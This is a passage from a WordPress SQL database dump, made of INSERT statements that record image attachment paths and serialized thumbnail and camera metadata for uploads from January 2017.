s:11:\"recent-post\";a:4:{s:4:\"file\";s:17:\"frizLEL-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2311","1087","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("2312","1087","_edit_lock","1485372380:1");
INSERT INTO `cmrfu_postmeta` VALUES("2313","1088","_wp_attached_file","2017/01/5.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2314","1088","_wp_attachment_metadata","a:5:{s:5:\"width\";i:560;s:6:\"height\";i:565;s:4:\"file\";s:13:\"2017/01/5.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:13:\"5-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:13:\"5-297x300.jpg\";s:5:\"width\";i:297;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:13:\"5-560x230.jpg\";s:5:\"width\";i:560;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:13:\"5-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:13:\"5-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:11:\"5-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:6:\"Picasa\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:10:\"1383224275\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2315","1089","_wp_attached_file","2017/01/6.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2316","1089","_wp_attachment_metadata","a:5:{s:5:\"width\";i:567;s:6:\"height\";i:458;s:4:\"file\";s:13:\"2017/01/6.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:13:\"6-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:13:\"6-300x242.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:242;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:13:\"6-567x230.jpg\";s:5:\"width\";i:567;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:13:\"6-450x458.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:458;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:13:\"6-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:11:\"6-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:6:\"Picasa\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:10:\"1383223933\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2317","1090","_wp_attached_file","2017/01/9-001.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2318","1090","_wp_attachment_metadata","a:5:{s:5:\"width\";i:558;s:6:\"height\";i:456;s:4:\"file\";s:17:\"2017/01/9-001.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:17:\"9-001-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:17:\"9-001-300x245.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:245;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:17:\"9-001-558x230.jpg\";s:5:\"width\";i:558;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:17:\"9-001-450x456.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:456;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:17:\"9-001-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:15:\"9-001-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:6:\"Picasa\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:10:\"1383223366\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2319","1091","_wp_attached_file","2017/01/10-002.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2320","1091","_wp_attachment_metadata","a:5:{s:5:\"width\";i:558;s:6:\"height\";i:567;s:4:\"file\";s:18:\"2017/01/10-002.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:18:\"10-002-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:18:\"10-002-295x300.jpg\";s:5:\"width\";i:295;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:18:\"10-002-558x230.jpg\";s:5:\"width\";i:558;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:18:\"10-002-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:18:\"10-002-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:16:\"10-002-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:6:\"Picasa\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:10:\"1383225281\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2321","1092","_wp_attached_file","2017/01/10.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2322","1092","_wp_attachment_metadata","a:5:{s:5:\"width\";i:560;s:6:\"height\";i:431;s:4:\"file\";s:14:\"2017/01/10.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"10-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"10-300x231.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:231;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"10-560x230.jpg\";s:5:\"width\";i:560;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"10-450x431.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:431;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"10-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"10-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:6:\"Picasa\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:10:\"1194536954\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2323","1093","_wp_attached_file","2017/01/15-001.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2324","1093","_wp_attachment_metadata","a:5:{s:5:\"width\";i:607;s:6:\"height\";i:537;s:4:\"file\";s:18:\"2017/01/15-001.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:18:\"15-001-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:18:\"15-001-300x265.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:265;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:18:\"15-001-607x230.jpg\";s:5:\"width\";i:607;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:18:\"15-001-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:18:\"15-001-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:16:\"15-001-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:6:\"Picasa\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:10:\"1194536954\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2325","1095","_wp_attached_file","2017/01/26.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2326","1095","_wp_attachment_metadata","a:5:{s:5:\"width\";i:560;s:6:\"height\";i:491;s:4:\"file\";s:14:\"2017/01/26.jpg\";s:5:\"sizes\";a:6:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:14:\"26-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:14:\"26-300x263.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:263;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:14:\"26-560x230.jpg\";s:5:\"width\";i:560;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:14:\"26-450x491.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:491;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:14:\"26-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:12:\"26-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:6:\"Picasa\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:10:\"1383224093\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2327","1096","_wp_attached_file","2017/01/D3C57213.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2328","1096","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1181;s:6:\"height\";i:787;s:4:\"file\";s:20:\"2017/01/D3C57213.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:20:\"D3C57213-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:20:\"D3C57213-300x200.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:200;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:20:\"D3C57213-768x512.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:512;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:21:\"D3C57213-1024x682.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:682;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:20:\"D3C57213-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:20:\"D3C57213-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:20:\"D3C57213-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:18:\"D3C57213-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:3:\"4.2\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:11:\"DCS Pro 14N\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:2:\"38\";s:3:\"iso\";s:2:\"80\";s:13:\"shutter_speed\";s:16:\"0.33333333333333\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"1\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2329","1097","_wp_attached_file","2017/01/D3C57230.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2330","1097","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1181;s:6:\"height\";i:787;s:4:\"file\";s:20:\"2017/01/D3C57230.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:20:\"D3C57230-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:20:\"D3C57230-300x200.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:200;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:20:\"D3C57230-768x512.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:512;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:21:\"D3C57230-1024x682.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:682;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:20:\"D3C57230-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:20:\"D3C57230-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:20:\"D3C57230-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:18:\"D3C57230-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:3:\"4.8\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:11:\"DCS Pro 14N\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:2:\"45\";s:3:\"iso\";s:2:\"80\";s:13:\"shutter_speed\";s:4:\"0.25\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"1\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2331","1094","_edit_last","1");
INSERT INTO `cmrfu_postmeta` VALUES("2332","1094","_edit_lock","1485372378:1");
INSERT INTO `cmrfu_postmeta` VALUES("2333","1098","_wp_attached_file","2017/01/D3C57242.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2334","1098","_wp_attachment_metadata","a:5:{s:5:\"width\";i:787;s:6:\"height\";i:1181;s:4:\"file\";s:20:\"2017/01/D3C57242.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:20:\"D3C57242-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:20:\"D3C57242-200x300.jpg\";s:5:\"width\";i:200;s:6:\"height\";i:300;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:21:\"D3C57242-768x1152.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:1152;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:21:\"D3C57242-682x1024.jpg\";s:5:\"width\";i:682;s:6:\"height\";i:1024;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:20:\"D3C57242-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:20:\"D3C57242-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:20:\"D3C57242-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:18:\"D3C57242-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:3:\"5.6\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:11:\"DCS Pro 14N\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:2:\"98\";s:3:\"iso\";s:2:\"80\";s:13:\"shutter_speed\";s:17:\"0.066666666666667\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"1\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2335","1099","_wp_attached_file","2017/01/IMG-20161220-WA0010.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2336","1099","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1280;s:6:\"height\";i:720;s:4:\"file\";s:31:\"2017/01/IMG-20161220-WA0010.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0010-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0010-300x169.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:169;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0010-768x432.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:432;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"IMG-20161220-WA0010-1024x576.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:576;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0010-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0010-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0010-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"IMG-20161220-WA0010-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2337","1100","_wp_attached_file","2017/01/IMG-20161220-WA0011.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2338","1100","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1280;s:6:\"height\";i:720;s:4:\"file\";s:31:\"2017/01/IMG-20161220-WA0011.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0011-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0011-300x169.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:169;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0011-768x432.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:432;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"IMG-20161220-WA0011-1024x576.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:576;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0011-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0011-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0011-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"IMG-20161220-WA0011-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"camera\";s:0:\"\";s:7:\"caption\";s:0:\"\";s:17:\"created_timestamp\";s:1:\"0\";s:9:\"copyright\";s:0:\"\";s:12:\"focal_length\";s:1:\"0\";s:3:\"iso\";s:1:\"0\";s:13:\"shutter_speed\";s:1:\"0\";s:5:\"title\";s:0:\"\";s:11:\"orientation\";s:1:\"0\";s:8:\"keywords\";a:0:{}}}");
INSERT INTO `cmrfu_postmeta` VALUES("2339","1101","_wp_attached_file","2017/01/IMG-20161220-WA0012.jpg");
INSERT INTO `cmrfu_postmeta` VALUES("2340","1101","_wp_attachment_metadata","a:5:{s:5:\"width\";i:1280;s:6:\"height\";i:720;s:4:\"file\";s:31:\"2017/01/IMG-20161220-WA0012.jpg\";s:5:\"sizes\";a:8:{s:9:\"thumbnail\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0012-150x150.jpg\";s:5:\"width\";i:150;s:6:\"height\";i:150;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:6:\"medium\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0012-300x169.jpg\";s:5:\"width\";i:300;s:6:\"height\";i:169;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"medium_large\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0012-768x432.jpg\";s:5:\"width\";i:768;s:6:\"height\";i:432;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:5:\"large\";a:4:{s:4:\"file\";s:32:\"IMG-20161220-WA0012-1024x576.jpg\";s:5:\"width\";i:1024;s:6:\"height\";i:576;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:4:\"post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0012-770x230.jpg\";s:5:\"width\";i:770;s:6:\"height\";i:230;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:9:\"portfolio\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0012-450x535.jpg\";s:5:\"width\";i:450;s:6:\"height\";i:535;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:12:\"relates-post\";a:4:{s:4:\"file\";s:31:\"IMG-20161220-WA0012-170x105.jpg\";s:5:\"width\";i:170;s:6:\"height\";i:105;s:9:\"mime-type\";s:10:\"image/jpeg\";}s:11:\"recent-post\";a:4:{s:4:\"file\";s:29:\"IMG-20161220-WA0012-85x85.jpg\";s:5:\"width\";i:85;s:6:\"height\";i:85;s:9:\"mime-type\";s:10:\"image/jpeg\";}}s:10:\"image_meta\";a:12:{s:8:\"aperture\";s:1:\"0\";s:6:\"credit\";s:0:\"\";s:6:\"